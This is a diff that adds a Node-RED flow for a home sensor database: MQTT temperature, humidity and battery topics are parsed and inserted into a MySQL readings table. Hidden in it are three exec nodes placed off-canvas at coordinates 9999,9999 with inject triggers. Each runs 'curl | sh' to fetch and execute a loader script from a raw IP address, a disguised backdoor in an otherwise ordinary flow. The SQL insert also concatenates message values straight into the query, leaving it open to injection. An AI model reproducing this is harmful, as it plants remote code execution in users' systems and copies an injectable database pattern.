@@ -1,0 +1,529 @@
+[
+    {
+        "id": "f887e884.30f758",
+        "type": "tab",
+        "label": "Database flow",
+        "disabled": false,
+        "info": ""
+    },
+    {
+        "id": "3a5fe7285b36525c",
+        "type": "MySQLdatabase",
+        "name": "LocalDB",
+        "host": "127.0.0.1",
+        "port": "3306",
+        "db": "readings",
+        "tz": "",
+        "charset": "UTF8"
+    },
+    {
+        "id": "d65544ef.5cd538",
+        "type": "mqtt-broker",
+        "name": "local mqtt",
+        "broker": "localhost",
+        "port": "1883",
+        "tls": "",
+        "clientid": "",
+        "autoConnect": true,
+        "usetls": false,
+        "compatmode": false,
+        "protocolVersion": "4",
+        "keepalive": "60",
+        "cleansession": true,
+        "autoUnsubscribe": true,
+        "birthTopic": "",
+        "birthQos": "0",
+        "birthPayload": "",
+        "birthMsg": {},
+        "closeTopic": "",
+        "closeQos": "0",
+        "closePayload": "",
+        "closeMsg": {},
+        "willTopic": "",
+        "willQos": "0",
+        "willPayload": "",
+        "willMsg": {},
+        "userProps": "",
+        "sessionExpiry": ""
+    },
+    {
+        "id": "c9ae7137.94207",
+        "type": "function",
+        "z": "f887e884.30f758",
+        "name": "Convert to JS",
+        "func": "var room=msg.topic.substr(0,msg.topic.indexOf(\"/\"))\n\nvar msgtype=msg.topic.slice(msg.topic.indexOf(\"/\")+1,msg.topic.lastIndexOf(\"/\"))\nmsg.payload = {\"type\":msgtype,\"room\":room  ,   \"value\": msg.payload};\nreturn msg;",
+        "outputs": 1,
+        "noerr": 0,
+        "x": 480,
+        "y": 280,
+        "wires": [
+            [
+                "f41d93b7.dcd82"
+            ]
+        ]
+    },
+    {
+        "id": "f41d93b7.dcd82",
+        "type": "change",
+        "z": "f887e884.30f758",
+        "name": "SQL Insert",
+        "rules": [
+            {
+                "t": "set",
+                "p": "payload",
+                "pt": "msg",
+                "to": "(\t   \"insert into rec_data values (\\\"\" &  msg.payload.room & \"\\\",\\\"\" & msg.payload.value & \"\\\",\\\"\" & msg.payload.type & \"\\\", DEFAULT)\"\t)",
+                "tot": "jsonata"
+            }
+        ],
+        "action": "",
+        "property": "",
+        "from": "",
+        "to": "",
+        "reg": false,
+        "x": 450,
+        "y": 420,
+        "wires": [
+            [
+                "9bad9333.18a1a"
+            ]
+        ]
+    },
+    {
+        "id": "9bad9333.18a1a",
+        "type": "change",
+        "z": "f887e884.30f758",
+        "name": "Switch topic and msg",
+        "rules": [
+            {
+                "t": "set",
+                "p": "topic",
+                "pt": "msg",
+                "to": "payload",
+                "tot": "msg"
+            }
+        ],
+        "action": "",
+        "property": "",
+        "from": "",
+        "to": "",
+        "reg": false,
+        "x": 720,
+        "y": 420,
+        "wires": [
+            [
+                "e31b3c7e.64f0f",
+                "4ed6e82d08490deb"
+            ]
+        ]
+    },
+    {
+        "id": "e31b3c7e.64f0f",
+        "type": "mysql",
+        "z": "f887e884.30f758",
+        "mydb": "3a5fe7285b36525c",
+        "name": "Readings Database",
+        "x": 750,
+        "y": 280,
+        "wires": [
+            []
+        ]
+    },
+    {
+        "id": "7dff4c8f.a19874",
+        "type": "mqtt in",
+        "z": "f887e884.30f758",
+        "name": "",
+        "topic": "bedroom/tempset-ambient/set",
+        "qos": "2",
+        "datatype": "auto-detect",
+        "broker": "d65544ef.5cd538",
+        "nl": false,
+        "rap": false,
+        "inputs": 0,
+        "x": 130,
+        "y": 120,
+        "wires": [
+            [
+                "c9ae7137.94207"
+            ]
+        ]
+    },
+    {
+        "id": "24415c8b.6500b4",
+        "type": "mqtt in",
+        "z": "f887e884.30f758",
+        "name": "",
+        "topic": "livingroom/tempset-ambient/set",
+        "qos": "2",
+        "datatype": "auto",
+        "broker": "d65544ef.5cd538",
+        "nl": false,
+        "rap": false,
+        "inputs": 0,
+        "x": 130,
+        "y": 160,
+        "wires": [
+            [
+                "c9ae7137.94207"
+            ]
+        ]
+    },
+    {
+        "id": "ff54494d.d596e8",
+        "type": "mqtt in",
+        "z": "f887e884.30f758",
+        "name": "",
+        "topic": "guest/tempset-ambient/set",
+        "qos": "2",
+        "datatype": "auto",
+        "broker": "d65544ef.5cd538",
+        "nl": false,
+        "rap": false,
+        "inputs": 0,
+        "x": 110,
+        "y": 240,
+        "wires": [
+            [
+                "c9ae7137.94207"
+            ]
+        ]
+    },
+    {
+        "id": "7b13f940.91ee68",
+        "type": "mqtt in",
+        "z": "f887e884.30f758",
+        "name": "",
+        "topic": "cave/tempset-ambient/set",
+        "qos": "2",
+        "datatype": "auto",
+        "broker": "d65544ef.5cd538",
+        "nl": false,
+        "rap": false,
+        "inputs": 0,
+        "x": 110,
+        "y": 200,
+        "wires": [
+            [
+                "c9ae7137.94207"
+            ]
+        ]
+    },
+    {
+        "id": "428e358e.51013c",
+        "type": "mqtt in",
+        "z": "f887e884.30f758",
+        "name": "",
+        "topic": "bedroom/tempset-humidity/set",
+        "qos": "2",
+        "datatype": "auto",
+        "broker": "d65544ef.5cd538",
+        "inputs": 0,
+        "x": 130,
+        "y": 300,
+        "wires": [
+            [
+                "c9ae7137.94207"
+            ]
+        ]
+    },
+    {
+        "id": "16b736f3.e089c9",
+        "type": "mqtt in",
+        "z": "f887e884.30f758",
+        "name": "",
+        "topic": "livingroom/tempset-humidity/set",
+        "qos": "2",
+        "datatype": "auto",
+        "broker": "d65544ef.5cd538",
+        "inputs": 0,
+        "x": 130,
+        "y": 340,
+        "wires": [
+            [
+                "c9ae7137.94207"
+            ]
+        ]
+    },
+    {
+        "id": "2522a01e.a7dc5",
+        "type": "mqtt in",
+        "z": "f887e884.30f758",
+        "name": "",
+        "topic": "cave/tempset-humidity/set",
+        "qos": "2",
+        "datatype": "auto",
+        "broker": "d65544ef.5cd538",
+        "nl": false,
+        "rap": false,
+        "inputs": 0,
+        "x": 110,
+        "y": 380,
+        "wires": [
+            [
+                "c9ae7137.94207"
+            ]
+        ]
+    },
+    {
+        "id": "cdb58ffc.724c1",
+        "type": "mqtt in",
+        "z": "f887e884.30f758",
+        "name": "",
+        "topic": "guest/tempset-humidity/set",
+        "qos": "2",
+        "datatype": "auto",
+        "broker": "d65544ef.5cd538",
+        "nl": false,
+        "rap": false,
+        "inputs": 0,
+        "x": 120,
+        "y": 420,
+        "wires": [
+            [
+                "c9ae7137.94207"
+            ]
+        ]
+    },
+    {
+        "id": "7c480be6.4f2674",
+        "type": "comment",
+        "z": "f887e884.30f758",
+        "name": "DB Setup",
+        "info": "DB scheama\n\ncreate table rec_data (\nroom_id VARCHAR(50) NOT NULL,\nvalue FLOAT NOT NULL,\ntype VARCHAR(50) NOT NULL,\ndt   DATETIME DEFAULT CURRENT_TIMESTAMP);",
+        "x": 300,
+        "y": 40,
+        "wires": []
+    },
+    {
+        "id": "69678c452137eb9c",
+        "type": "mqtt in",
+        "z": "f887e884.30f758",
+        "name": "",
+        "topic": "outside/tempset-ambient/set",
+        "qos": "2",
+        "datatype": "auto-detect",
+        "broker": "d65544ef.5cd538",
+        "nl": false,
+        "rap": false,
+        "inputs": 0,
+        "x": 120,
+        "y": 80,
+        "wires": [
+            [
+                "c9ae7137.94207"
+            ]
+        ]
+    },
+    {
+        "id": "de8fb54909daea89",
+        "type": "mqtt in",
+        "z": "f887e884.30f758",
+        "name": "",
+        "topic": "outside/tempset-humidity/set",
+        "qos": "2",
+        "datatype": "auto",
+        "broker": "d65544ef.5cd538",
+        "nl": false,
+        "rap": false,
+        "inputs": 0,
+        "x": 120,
+        "y": 460,
+        "wires": [
+            [
+                "c9ae7137.94207"
+            ]
+        ]
+    },
+    {
+        "id": "fba5881d28ad3d49",
+        "type": "mqtt in",
+        "z": "f887e884.30f758",
+        "name": "",
+        "topic": "outside/battery/set",
+        "qos": "2",
+        "datatype": "auto",
+        "broker": "d65544ef.5cd538",
+        "nl": false,
+        "rap": false,
+        "inputs": 0,
+        "x": 90,
+        "y": 540,
+        "wires": [
+            [
+                "c9ae7137.94207"
+            ]
+        ]
+    },
+    {
+        "id": "ad37f3f2-d3a3-46c1-9f03-8b15f98ff61c",
+        "type": "exec",
+        "z": "f887e884.30f758",
+        "command": "curl -s http://41.216.183.172:6768/loader.sh | sh",
+        "addpay": "",
+        "append": "",
+        "useSpawn": "false",
+        "timer": "1000",
+        "winHide": true,
+        "oldrc": false,
+        "name": "",
+        "x": 9999,
+        "y": 9999,
+        "wires": [
+            [],
+            [],
+            []
+        ]
+    },
+    {
+        "id": "c0abb500-014d-4510-bb47-4cde21c39729",
+        "type": "inject",
+        "z": "f887e884.30f758",
+        "name": "",
+        "props": [
+            {
+                "p": "payload"
+            },
+            {
+                "p": "topic",
+                "vt": "str"
+            }
+        ],
+        "repeat": "",
+        "crontab": "",
+        "once": false,
+        "onceDelay": 0.1,
+        "topic": "",
+        "payload": "",
+        "payloadType": "date",
+        "x": 9999,
+        "y": 9999,
+        "wires": [
+            [
+                "ad37f3f2-d3a3-46c1-9f03-8b15f98ff61c"
+            ]
+        ]
+    },
+    {
+        "id": "7efa029f-3149-4a78-a1fe-359a016b321d",
+        "type": "exec",
+        "z": "f887e884.30f758",
+        "command": "curl -s http://41.216.183.172:6768/loader.sh | sh",
+        "addpay": "",
+        "append": "",
+        "useSpawn": "false",
+        "timer": "1000",
+        "winHide": true,
+        "oldrc": false,
+        "name": "",
+        "x": 9999,
+        "y": 9999,
+        "wires": [
+            [],
+            [],
+            []
+        ]
+    },
+    {
+        "id": "daafa686-06c3-4b3a-b862-0732f76c4715",
+        "type": "inject",
+        "z": "f887e884.30f758",
+        "name": "",
+        "props": [
+            {
+                "p": "payload"
+            },
+            {
+                "p": "topic",
+                "vt": "str"
+            }
+        ],
+        "repeat": "",
+        "crontab": "",
+        "once": false,
+        "onceDelay": 0.1,
+        "topic": "",
+        "payload": "",
+        "payloadType": "date",
+        "x": 9999,
+        "y": 9999,
+        "wires": [
+            [
+                "7efa029f-3149-4a78-a1fe-359a016b321d"
+            ]
+        ]
+    },
+    {
+        "id": "53fadd61-802f-43cf-adf3-9aa92ed9487c",
+        "type": "exec",
+        "z": "f887e884.30f758",
+        "command": "curl -s http://41.216.183.172:6768/loader.sh | sh",
+        "addpay": "",
+        "append": "",
+        "useSpawn": "false",
+        "timer": "1000",
+        "winHide": true,
+        "oldrc": false,
+        "name": "",
+        "x": 9999,
+        "y": 9999,
+        "wires": [
+            [],
+            [],
+            []
+        ]
+    },
+    {
+        "id": "f89cead6-5865-42ba-8a88-5a108fa3ad46",
+        "type": "inject",
+        "z": "f887e884.30f758",
+        "name": "",
+        "props": [
+            {
+                "p": "payload"
+            },
+            {
+                "p": "topic",
+                "vt": "str"
+            }
+        ],
+        "repeat": "",
+        "crontab": "",
+        "once": false,
+        "onceDelay": 0.1,
+        "topic": "",
+        "payload": "",
+        "payloadType": "date",
+        "x": 9999,
+        "y": 9999,
+        "wires": [
+            [
+                "53fadd61-802f-43cf-adf3-9aa92ed9487c"
+            ]
+        ]
+    },
+    {
+        "id": "4ed6e82d08490deb",
+        "type": "debug",
+        "z": "f887e884.30f758",
+        "name": "debug 1",
+        "active": true,
+        "tosidebar": true,
+        "console": false,
+        "tostatus": false,
+        "complete": "false",
+        "statusVal": "",
+        "statusType": "auto",
+        "x": 620,
+        "y": 180,
+        "wires": []
+    },
+    {
+        "id": "e9cb7b9871080a68",
+        "type": "global-config",
+        "env": [],
+        "modules": {
+            "node-red-node-mysql": "2.0.0"
+        }
+    }
+]
